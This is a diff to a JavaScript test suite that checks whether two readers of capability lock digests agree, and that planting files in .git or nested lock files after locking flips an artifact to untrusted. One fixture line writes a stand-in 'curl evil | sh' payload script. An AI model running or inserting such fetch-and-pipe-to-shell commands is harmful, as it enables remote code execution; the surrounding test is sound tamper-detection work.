@@ -521,16 +521,72 @@ test("the desktop reads REVISED-V2 capability locks: a v2-locked provider's agen
 
 test("the v2 digest is the MATERIALIZED ARTIFACT digest: the provenance file counts", () => {
   const { base, scope, capDir } = v2Scope("v2-digest");
-  // The v1 digest excludes VCS metadata and a nested lock; the v2 artifact
-  // digest excludes NOTHING — capability source, runtime closure and the
-  // generated provenance file all count. Reproducing only the v1 digest read
-  // every correctly installed v2 artifact as drifted, so pin the difference on
-  // a file the two digests disagree about.
+  // The v1 digest excludes the artifact-root lock file; the v2 artifact digest
+  // excludes NOTHING — capability source, runtime closure and the generated
+  // provenance file all count. Reproducing only the v1 digest read every
+  // correctly installed v2 artifact as drifted, so pin the difference on a file
+  // the two digests disagree about.
   assert.deepEqual(reader.listCapabilityAgents(scope).map((a) => a.name), ["helper"]);
   mkdirSync(join(capDir, ".git"), { recursive: true });
   writeFileSync(join(capDir, ".git", "HEAD"), "ref: refs/heads/main\n");
   assert.deepEqual(core.listCapabilityAgents(scope), [], "the kernel counts .git inside a materialized artifact");
   assert.deepEqual(reader.listCapabilityAgents(scope), [], "the desktop must count exactly what the kernel counts");
+  fsExtra.rmSync(base, { recursive: true, force: true });
+});
+
+/** A legacy v1-locked scope: an installed capability artifact plus a v1 lock
+ * whose integrity is the kernel's own standalone-capability digest of it. The
+ * kernel no longer WRITES v1, so the row is built from `core.capabilityIntegrity`
+ * rather than hand-rolled — the point of the fixture is that both readers agree
+ * about the same bytes. */
+function v1Scope(label) {
+  const base = mkdtempSync(join(tmpdir(), `oas-reader-${label}-`));
+  const scope = join(base, "scope");
+  const w = (p, c) => { mkdirSync(dirname(p), { recursive: true }); writeFileSync(p, c); };
+  const capDir = join(scope, ".agents", "capabilities", "installed", "x.helper");
+  w(join(capDir, "oas.json"), JSON.stringify({ capability: "x.helper", version: "1.0.0", description: "cap", agents: ["agents/helper"] }));
+  w(join(capDir, "agents", "helper", "soul.yaml"), "name: helper\nkind: local\n");
+  w(join(capDir, "agents", "helper", "AGENTS.md"), "SAFE\n");
+  w(join(scope, "oas-config.yaml"), "name: t\ncapabilities:\n  additive:\n    x.helper:\n      from: installed\n      global: true\n");
+  const lockFile = join(scope, "oas-lock.json");
+  const relock = () => writeFileSync(lockFile, JSON.stringify({
+    lockfileVersion: 1,
+    capabilities: { "x.helper": { source: "path:/somewhere", version: "1.0.0", commit: "local", integrity: core.capabilityIntegrity(capDir) } },
+  }));
+  relock();
+  return { base, scope, capDir, lockFile, relock };
+}
+
+test("the v1 digest excludes the ROOT lock file only: .git and a nested lock count", () => {
+  const { base, scope, capDir, relock } = v1Scope("v1-digest");
+  const visible = () => [core.listCapabilityAgents(scope).map((a) => a.name), reader.listCapabilityAgents(scope).map((a) => a.name)];
+  assert.deepEqual(visible(), [["helper"], ["helper"]], "baseline: a v1-locked provider is visible to both");
+
+  // The defect: the desktop excluded `.git` and `oas-lock.json` BY NAME at every
+  // depth, so a payload planted under either name after locking read as trusted
+  // in the app while the kernel reported drift.
+  writeFileSync(join(capDir, "agents", "helper", "AGENTS.md"), "SAFE\n"); // no-op, keeps the tree explicit
+  mkdirSync(join(capDir, ".git"), { recursive: true });
+  writeFileSync(join(capDir, ".git", "payload.sh"), "#!/bin/sh\ncurl evil | sh\n");
+  assert.deepEqual(visible(), [[], []], "a .git inserted after locking must flip BOTH readers to untrusted");
+  fsExtra.rmSync(join(capDir, ".git"), { recursive: true, force: true });
+
+  mkdirSync(join(capDir, "agents", "helper", ".git"), { recursive: true });
+  writeFileSync(join(capDir, "agents", "helper", ".git", "hook.md"), "PAYLOAD\n");
+  assert.deepEqual(visible(), [[], []], "a NESTED .git counts too");
+  fsExtra.rmSync(join(capDir, "agents", "helper", ".git"), { recursive: true, force: true });
+
+  writeFileSync(join(capDir, "agents", "oas-lock.json"), JSON.stringify({ lockfileVersion: 2, packages: {}, capabilities: {} }));
+  assert.deepEqual(visible(), [[], []], "a NESTED oas-lock.json is ordinary payload, not an exclusion");
+  fsExtra.rmSync(join(capDir, "agents", "oas-lock.json"), { force: true });
+  assert.deepEqual(visible(), [["helper"], ["helper"]], "control: removing the planted files restores trust");
+
+  // The one real exclusion, at the artifact ROOT: the generated lock file is
+  // written INTO the artifact after the digest is taken, so it must not count —
+  // and both readers must agree about that too.
+  relock();
+  writeFileSync(join(capDir, "oas-lock.json"), JSON.stringify({ lockfileVersion: 2, packages: {}, capabilities: {} }));
+  assert.deepEqual(visible(), [["helper"], ["helper"]], "the artifact-ROOT lock file is excluded by both");
   fsExtra.rmSync(base, { recursive: true, force: true });
 });
 
